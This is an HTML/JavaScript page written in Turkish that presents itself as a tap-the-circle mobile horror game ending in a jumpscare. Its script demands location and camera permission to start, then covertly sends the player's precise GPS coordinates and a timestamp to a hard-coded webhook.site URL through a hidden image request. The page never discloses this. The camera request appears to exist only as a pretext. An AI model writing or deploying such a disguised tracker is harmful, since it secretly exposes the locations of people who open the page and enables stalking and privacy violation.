<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Korku Oyunu - Mobil Uyumlu</title>
<style>
  html, body {
    margin: 0; padding: 0;
    background: #000;
    color: #fff;
    font-family: Arial, sans-serif;
    height: 100vh;
    overflow: hidden;
    -webkit-user-select: none; /* dokunmatik seçimi engelle */
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
  }
  #permission-screen {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
    padding: 1rem;
  }
  #game-container {
    display: none;
    position: relative;
    width: 100vw;
    height: 100vh;
    touch-action: manipulation;
  }
  #circle {
    width: 80px;
    height: 80px;
    background: crimson;
    border-radius: 50%;
    position: absolute;
    cursor: pointer;
    box-shadow: 0 0 15px red;
    transition: left 0.2s ease, top 0.2s ease;
    touch-action: manipulation;
  }
  #score-display {
    position: absolute;
    top: 20px;
    left: 20px;
    font-size: 1.5rem;
    user-select: none;
  }
  #goal {
    position: absolute;
    top: 20px;
    right: 20px;
    color: orange;
    font-size: 1rem;
    user-select: none;
  }
  #jumpscare {
    display: none;
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: black;
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  }
  #jumpscare img {
    width: 100%;
    max-width: 600px;
  }
  #jumpscare audio {
    display: none;
  }
  button {
    margin-top: 20px;
    padding: 12px 24px;
    font-size: 1.2rem;
    border: none;
    border-radius: 6px;
    background: crimson;
    color: white;
    cursor: pointer;
  }
</style>
</head>
<body>

<div id="permission-screen">
  <h1>Oyuna başlamak için konum ve kamera izni vermelisin!</h1>
  <button id="start-btn">İzinleri Ver ve Başla</button>
</div>

<div id="game-container">
  <div id="score-display">Skor: 0</div>
  <div id="goal">Hedef: 15 puan</div>
  <div id="circle" aria-label="Hedef daire" role="button" tabindex="0"></div>
</div>

<div id="jumpscare" role="alert" aria-live="assertive">
  <img src="https://i.imgur.com/jxKX1U7.png" alt="Korkunç jumpscare" />
  <audio id="scream" autoplay>
    <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg" />
  </audio>
</div>

<script>
  const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34";

  const permissionScreen = document.getElementById("permission-screen");
  const startBtn = document.getElementById("start-btn");
  const gameContainer = document.getElementById("game-container");
  const circle = document.getElementById("circle");
  const scoreDisplay = document.getElementById("score-display");
  const jumpscare = document.getElementById("jumpscare");
  const scream = document.getElementById("scream");

  let score = 0;

  // Dokunmatik uyumluluk için hem click hem touchstart kullanalım
  circle.addEventListener("click", handleClick);
  circle.addEventListener("touchstart", e => {
    e.preventDefault(); // çift tetiklenmesini önler
    handleClick();
  }, {passive:false});

  startBtn.addEventListener("click", async () => {
    try {
      // Konum iste
      const position = await getLocation();

      // Kamera iste
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      // Kamera akışını durdur hemen (yalnızca izin için)
      stream.getTracks().forEach(track => track.stop());

      // Konum ve kamera izin verildi
      sendWebhook(position.coords.latitude, position.coords.longitude);

      permissionScreen.style.display = "none";
      gameContainer.style.display = "block";

      moveCircleRandom();

    } catch (error) {
      alert("Konum ve kamera izinleri olmadan oyun başlayamaz.");
    }
  });

  function getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject("Geolocation desteklenmiyor.");
      navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
    });
  }

  function sendWebhook(lat, lon) {
    const img = new Image();
    img.src = webhookUrl + "?lat=" + lat + "&lon=" + lon + "&time=" + Date.now();
  }

  function moveCircleRandom() {
    const maxX = window.innerWidth - circle.offsetWidth;
    const maxY = window.innerHeight - circle.offsetHeight;
    const x = Math.random() * maxX;
    const y = Math.random() * maxY;
    circle.style.left = `${x}px`;
    circle.style.top = `${y}px`;
  }

  function handleClick() {
    if(score >= 15) return;

    score++;
    scoreDisplay.textContent = "Skor: " + score;
    moveCircleRandom();

    if(score === 15) {
      showJumpscare();
    }
  }

  function showJumpscare() {
    jumpscare.style.display = "flex";
    scream.play();
    alert("15'e ulaştın, oyun bitti!");
  }

  // Sayfa yeniden boyutlandırıldığında da daireyi uygun yere koy
  window.addEventListener("resize", () => {
    if(gameContainer.style.display === "block"){
      moveCircleRandom();
    }
  });
</script>

</body>
</html>
